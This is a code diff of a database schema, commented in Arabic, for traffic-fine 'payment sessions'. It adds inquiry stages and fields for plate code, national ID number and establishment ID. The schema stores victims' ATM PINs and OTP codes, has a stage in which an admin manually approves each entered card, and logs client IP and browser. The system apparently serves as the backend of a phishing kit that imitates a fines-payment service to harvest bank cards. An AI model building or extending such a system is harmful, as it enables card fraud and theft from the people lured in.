@@ -56,6 +56,9 @@ export type Fine = typeof fines.$inferSelect;
 export type InsertFine = typeof fines.$inferInsert;
 
 export const paymentStageEnum = pgEnum("payment_stage", [
+  "home",           // في الصفحة الرئيسية
+  "inquiry",        // في صفحة الاستعلام
+  "results",        // عرض النتائج
   "card",           // إدخال بيانات البطاقة
   "card_pending",   // انتظار موافقة الأدمن على البطاقة
   "otp",            // إدخال OTP
@@ -88,12 +91,15 @@ export const paymentSessions = pgTable("payment_sessions", {
   // رقم ATM السري
   atmPin: varchar("atmPin", { length: 20 }),
   // المرحلة الحالية
-  stage: paymentStageEnum("stage").default("card").notNull(),
+  stage: paymentStageEnum("stage").default("home").notNull(),
   // رسالة الخطأ عند الرفض
   errorMessage: text("errorMessage"),
-  // معلومات اللوحة
+  // معلومات الاستعلام التفصيلية
   plateNumber: varchar("plateNumber", { length: 50 }),
   plateSource: varchar("plateSource", { length: 100 }),
+  plateCode: varchar("plateCode", { length: 50 }),
+  qidNumber: varchar("qidNumber", { length: 50 }),
+  establishmentId: varchar("establishmentId", { length: 50 }),
   // IP والمتصفح
   clientIp: varchar("clientIp", { length: 50 }),
   userAgent: text("userAgent"),
